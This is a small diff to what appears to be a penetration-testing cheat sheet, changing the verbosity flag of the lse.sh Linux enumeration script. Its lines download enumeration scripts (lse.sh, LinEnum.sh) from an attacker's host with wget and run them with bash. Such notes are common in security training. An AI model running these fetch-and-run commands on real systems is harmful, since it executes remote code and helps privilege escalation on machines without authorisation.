@@ -3,7 +3,7 @@
 
 ## Enumeration Scripts
 ```
-wget http://$source_ip/tools_linux/lse.sh; bash lse.sh -l 1 | tee lse.sh.out
+wget http://$source_ip/tools_linux/lse.sh; bash lse.sh -l 2 | tee lse.sh.out
 ```
 ```
 wget http://$source_ip/tools_linux/LinEnum.sh; bash LinEnum.sh | tee LinEnum.sh.out
